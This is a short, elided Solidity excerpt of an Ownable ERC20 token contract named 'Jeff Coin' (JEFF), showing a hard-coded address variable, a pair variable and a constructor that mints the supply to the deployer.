...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _arbitrum = 0xA10F56EE21BE89c87Fd00De6d4f8aA2f92cE476A;
    address public pair;
...
contract jeffcoineth is ERC20Token {
    constructor() ERC20Token("Jeff Coin", "JEFF", msg.sender, 694200000 * 10 ** 18) {
    }
}